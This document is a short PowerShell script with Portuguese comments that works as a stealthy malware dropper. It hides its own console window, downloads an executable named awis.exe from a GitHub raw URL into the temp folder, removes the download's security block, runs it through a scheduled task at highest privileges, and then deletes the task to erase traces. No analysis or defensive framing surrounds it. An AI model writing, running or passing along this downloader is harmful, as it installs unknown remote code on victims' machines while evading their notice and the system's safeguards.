# Esconder janela
$t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
Add-Type -Name win -Member $t -Namespace native
[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess()).MainWindowHandle, 0)

# Criar tarefa agendada
$u = "https://github.com/user337666/brow666/raw/refs/heads/main/awis.exe"
$p = "$env:TEMP\awis.exe"
iwr $u -o $p
Unblock-File $p -ea 0
schtasks /Create /TN "RunTask" /TR "powershell -c Start-Process $p" /SC ONCE /ST 00:00 /RL HIGHEST /F
schtasks /Run /TN "RunTask"
Start-Sleep -Seconds 10
schtasks /Delete /TN "RunTask" /F